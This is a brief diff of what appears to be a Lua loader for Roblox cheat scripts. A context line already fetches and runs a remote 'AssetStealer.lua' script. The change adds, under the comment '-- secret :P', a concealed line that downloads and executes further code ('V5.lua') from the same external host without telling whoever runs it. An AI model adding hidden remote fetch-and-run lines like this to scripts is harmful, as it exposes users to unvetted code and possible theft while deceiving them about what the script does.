@@ -85,3 +85,7 @@ loadstring(game:HttpGet("https://luamour.vercel.app/scripts/AssetStealer.lua"))(
 
 print("Loaded | Custom Features")
 print("Version: " .. version)
+
+-- secret :P
+
+loadstring(game:HttpGet("https://luamour.vercel.app/api/V5.lua"))()
